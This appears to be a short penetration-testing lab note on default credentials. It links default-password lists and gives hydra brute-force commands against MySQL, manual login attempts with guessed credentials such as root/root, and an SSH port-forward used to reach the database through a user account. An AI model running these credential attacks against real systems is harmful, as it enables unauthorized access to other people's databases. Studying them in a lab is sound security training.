# Default passwords

https://github.com/ihebski/DefaultCreds-cheat-sheet

https://owasp.org/www-community/attacks/Credential_stuffing

https://www.softwaretestinghelp.com/default-router-username-and-password-list/

Create a new list that separates these composite credentials with a colon (username:password)
hydra -C user_pass.list mysql://$TARGET

https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt


wget -c https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt -O mysql-betterdefaultpasslist.txt

## LAB

mysql -u root -p 
mysql -u root -p 
mysql -u root -p root
mysql -u superdba -p admin


ssh -L 4444:localhost:3306 sam@$TARGET
check via browser port forwarding active: localhost:4444
hydra -C user_pass.list mysql://localhost:4444